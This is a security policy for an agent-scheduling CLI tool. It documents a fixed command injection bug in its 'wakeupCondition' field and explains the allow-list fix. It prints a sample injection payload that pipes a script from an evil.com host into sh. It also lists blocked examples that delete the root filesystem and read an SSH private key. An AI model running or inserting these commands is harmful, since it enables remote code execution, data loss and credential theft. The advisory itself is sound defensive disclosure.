# Security Policy

## Supported Versions

| Version | Supported          |
| ------- | ------------------ |
| < 0.5.0 | :white_check_mark: |
| >= 0.5.0 | :white_check_mark: |

## Reporting a Vulnerability

If you discover a security vulnerability, please report it via GitHub Issues or email the maintainer directly. We aim to respond within 48 hours and provide a fix within 7 days for critical issues.

## Known Vulnerabilities (Fixed)

### CVE-like: Command Injection via Wakeup Condition (Fixed in v0.5.0)

**Severity**: Critical (P0) - Remote Code Execution

**Affected Versions**: v0.4.0 and earlier

**Description**: The `wakeupCondition` field in heartbeat configuration was stored in JSON/YAML files and executed via `sh -c` without validation. The web API endpoint (`PUT /api/v1/heartbeat/{project}/{agent}`) allowed setting this field arbitrarily, enabling command injection if API credentials were compromised or authorization was insufficient.

**Attack Vector**: An attacker with API access could set `wakeupCondition` to:
```json
{"wakeupCondition": "; curl https://evil.com/shell.sh | sh"}
```
This would be executed when the scheduler runs, giving the attacker RCE on the host machine.

**Fix Applied** (v0.5.0):
1. **API Endpoint Hardened**: The `wakeupCondition` field is no longer accepted via the PATCH API endpoint. Setting this field requires CLI access (`agencycli scheduler configure --wakeup-condition`).
2. **CLI Validation**: A whitelist-based validation function `validateWakeupCondition()` blocks dangerous shell metacharacters and only allows safe commands (`gh`, `agencycli`, `git`, `grep`, `jq`, `test`, `true`, `false`).
3. **Environment Variable Restrictions**: Only predefined safe environment variables (`$AGENCY_DIR`, `$PROJECT`, `$AGENT_NAME`) and positional parameters are allowed.

**Migration Guide**: If you were setting `wakeupCondition` via the web API, switch to CLI:
```bash
agencycli scheduler configure --project my-project --agent pm \
  --wakeup-condition "gh issue list --state open | grep -q ."
```

## Security Best Practices

### Wakeup Conditions

When configuring `wakeupCondition`, follow these guidelines:

1. **Use only allowed commands**: `gh`, `agencycli`, `git`, `grep`, `jq`, `test`, `true`, `false`
2. **Avoid shell metacharacters**: Do not use `;`, `&&`, `||`, `$()`, backticks, `>`, `<`, `&`
3. **Use safe environment variables**: Only `$AGENCY_DIR`, `$PROJECT`, `$AGENT_NAME`
4. **Simple pipe chains**: Single `|` for chaining is allowed

**Valid examples**:
```bash
gh issue list --state open --label agent-ready | grep -q .
agencycli --dir $AGENCY_DIR inbox messages --unread-only | grep -q .
git status --porcelain | grep -q .
jq -r '.count' $AGENCY_DIR/stats.json
test -f $AGENCY_DIR/.stop
```

**Invalid examples (blocked)**:
```bash
# Command injection - blocked
gh issue list; rm -rf /

# Disallowed command - blocked
curl https://example.com

# Unsafe env var - blocked
cat $HOME/.ssh/id_rsa
```

### API Security

- The web API runs on localhost by default. Do not expose it to the internet without proper authentication.
- Use environment variable `AGENCYCLI_API_KEY` to enable API authentication.
- Configure firewall rules to restrict access to the API port.

### Sandbox Execution

For maximum security, run agents inside Docker sandboxes:
```bash
agencycli sandbox run --project my-project --agent dev
```

This isolates agent execution from the host system.

## Security Changelog

- **v0.5.0**: Fixed command injection vulnerability in `wakeupCondition` (Issue #1)